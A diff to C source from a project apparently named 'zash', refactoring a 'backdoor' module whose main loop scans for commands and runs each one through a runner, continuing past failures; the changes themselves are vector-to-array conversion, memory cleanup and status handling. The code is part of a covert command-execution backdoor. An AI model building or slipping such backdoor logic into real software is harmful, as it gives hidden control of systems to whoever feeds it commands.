@@ -23,18 +23,31 @@ backdoor_run_commands(const struct SCANNER_data *const commands[], size_t comman
     enum zash_status status = ZASH_STATUS_UNINITIALIZED;
 
     size_t i = 0;
+    char const *const *argv = NULL;
+    size_t argc = 0;
 
     /* Run all of the commands. */
     for (i = 0; i < commands_amount; ++i) {
-        /* Run the command. ignore return value - the backdoor
-         * should continue even if a command has failed. */
-        (void) RUNNER_run(commands[i]->id,
-                          commands[i]->argv->array_size,
-                          (char **) commands[i]->argv->array);
+//TODO: docu
+        status = VECTOR_as_array(commands[i]->argv, (void const *const **) &argv, &argc);
+        if (ZASH_STATUS_SUCCESS != status) {
+            DEBUG_PRINT("status: %d", status);
+            goto lbl_cleanup;
+        }
+
+        /* Run the current command. */
+        status = RUNNER_run(commands[i]->id, argc, argv);
+        if (ZASH_STATUS_SUCCESS != status) {
+            DEBUG_PRINT("status: %d", status);
+            /* dont pass the error value - the backdoor
+             * should continue even if a command has failed. */
+        }
     }
 
     /* Indicate Success */
     status = ZASH_STATUS_SUCCESS;
+
+lbl_cleanup:
 
     return status;
 }
@@ -47,6 +60,9 @@ enum zash_status backdoor_main_loop(const bool *should_stop)
 
     struct SCANNER_context *scanner = NULL;
     struct VECTOR_context *commands = NULL;
+    const struct SCANNER_data *const *commands_array = NULL;
+    size_t commands_size = 0;
+
 
     /* Check for valid parameters */
     if (NULL == should_stop) {
@@ -71,14 +87,27 @@ enum zash_status backdoor_main_loop(const bool *should_stop)
             DEBUG_PRINT("status: %d", status);
             goto lbl_cleanup;
         }
-
-        /* Run all commands found */
-        status = backdoor_run_commands((const struct SCANNER_data **) commands->array,
-                                       commands->array_size);
+//TODO: docu
+        status = VECTOR_as_array(commands, (const void *const **) &commands_array, &commands_size);
         if (ZASH_STATUS_SUCCESS != status) {
             DEBUG_PRINT("status: %d", status);
             goto lbl_cleanup;
         }
+
+        /* Run all commands found */
+        status = backdoor_run_commands(commands_array, commands_size);
+        if (ZASH_STATUS_SUCCESS != status) {
+            DEBUG_PRINT("status: %d", status);
+            goto lbl_cleanup;
+        }
+
+        /* Free the commands vector */
+        status = VECTOR_destroy(commands, (VECTOR_free_func_t) SCANNER_free_data);
+        if (ZASH_STATUS_SUCCESS != status) {
+            DEBUG_PRINT("status: %d", status);
+            goto lbl_cleanup;
+        }
+        commands = NULL;
 
     }
 
@@ -185,7 +214,7 @@ lbl_cleanup:
 enum zash_status BACKDOOR_destroy(struct BACKDOOR_context *context)
 {
 
-    enum zash_status status = ZASH_STATUS_SUCCESS;
+    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
     enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;
 
     enum zash_status backdoor_main_loop_return_value = ZASH_STATUS_UNINITIALIZED;
@@ -212,6 +241,9 @@ enum zash_status BACKDOOR_destroy(struct BACKDOOR_context *context)
 
     }
     HEAPFREE(context);
+
+    /* If no error status was set, indicate success */
+    ZASH_UPDATE_STATUS(status, ZASH_STATUS_SUCCESS);
 
     return status;
 }
